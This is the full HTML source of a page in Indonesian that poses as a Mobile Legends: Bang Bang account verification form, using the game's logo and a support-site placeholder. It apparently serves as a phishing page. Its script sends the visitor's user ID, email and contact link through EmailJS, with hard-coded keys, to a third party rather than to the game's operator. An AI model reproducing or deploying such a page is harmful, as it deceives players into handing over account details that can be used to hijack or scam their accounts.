<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifikasi Akun MLBB</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #1f344e;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #2e4a6f;
      padding: 30px;
      border-radius: 12px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      height: 50px;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
    }

    button {
      margin-top: 20px;
      width: 100%;
      background-color: #007bff;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #005dc7;
    }
  </style>
  <script>
    (function() {
      emailjs.init("KALXUazyAtLBJNz9t");
    })();

    function sendEmail() {
      var userId = document.getElementById("user_id").value;
      var userEmail = document.getElementById("user_email").value;
      var contactLink = document.getElementById("contact_link").value;

      emailjs.send("service_31nufml", "template_h82uvir", {
        user_id: userId,
        user_email: userEmail,
        contact_link: contactLink,
        ip_address: "127.0.0.1"
      })
      .then(function(response) {
        alert("Berhasil dikirim!");
      }, function(error) {
        alert("Gagal mengirim. Silakan coba lagi.");
        console.error("EmailJS error:", error);
      });
    }
  </script>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.ibb.co/TBdv1F7Y/download-removebg-preview.png" alt="MLBB Logo" />
    </div>
    <label for="user_id">User ID:</label>
    <input type="text" id="user_id" placeholder="Contoh: 12345678" />

    <label for="user_email">Email Anda:</label>
    <input type="email" id="user_email" placeholder="example@email.com" />

    <label for="contact_link">Link Kontak:</label>
    <input type="text" id="contact_link" placeholder="https://support.mobilelegends.com" />

    <button onclick="sendEmail()">Kirim Permintaan</button>
  </div>
</body>
</html>
